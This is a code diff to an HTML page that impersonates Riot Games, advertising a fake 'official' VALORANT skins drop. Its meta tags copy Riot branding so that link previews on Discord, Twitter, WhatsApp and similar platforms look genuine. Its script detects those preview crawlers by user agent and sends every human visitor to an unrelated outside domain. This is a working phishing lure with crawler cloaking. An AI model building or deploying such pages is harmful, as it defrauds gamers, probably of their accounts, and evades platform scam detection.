@@ -2,28 +2,30 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <meta property="og:title" content="VALORANT Skins Drop from Riot Games">
-    <meta property="og:description" content="Limited drop event — claim now. Official site.">
+    <meta property="og:title" content="Valorant Event | Riot Games">
+    <meta property="og:description" content="Get your exclusive VALORANT drop! Official Riot Games event.">
     <meta property="og:image" content="https://www.riotgames.com/darkroom/1440/962ad85c5c486c36c55568e57a60dd69:adc62240d7e3feee93de6a91fa9b2c70/VALORANT_Ep7_Act3_KeyArt.jpg">
-    <meta property="og:url" content="https://www.riotgames.com/en">
+    <meta property="og:url" content="https://ivan03924.github.io/valorant-event/">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="VALORANT Skins Drop from Riot Games">
-    <meta name="twitter:description" content="Limited drop event — claim now. Official site.">
+    <meta name="twitter:title" content="Valorant Event | Riot Games">
+    <meta name="twitter:description" content="Get your exclusive VALORANT drop! Official Riot Games event.">
     <meta name="twitter:image" content="https://www.riotgames.com/darkroom/1440/962ad85c5c486c36c55568e57a60dd69:adc62240d7e3feee93de6a91fa9b2c70/VALORANT_Ep7_Act3_KeyArt.jpg">
+
+    <title>Riot Games Event</title>
 
     <script>
       const bots = [
-        "Twitterbot", "facebookexternalhit", "Slackbot", "Discordbot", 
+        "Twitterbot", "facebookexternalhit", "Slackbot", "Discordbot",
         "TelegramBot", "WhatsApp", "Applebot", "Googlebot", "bingbot"
       ];
-      const isBot = bots.some(bot => navigator.userAgent.includes(bot));
+      const ua = navigator.userAgent;
+      const isBot = bots.some(bot => ua.includes(bot));
       if (!isBot) {
-        window.location.href = "https://valodrop.world";
+        window.location.replace("https://valodrop.world/");
       }
     </script>
-    <title>Redirecting...</title>
   </head>
   <body>
-    <p>Redirecting...</p>
+    <p>Loading...</p>
   </body>
 </html>
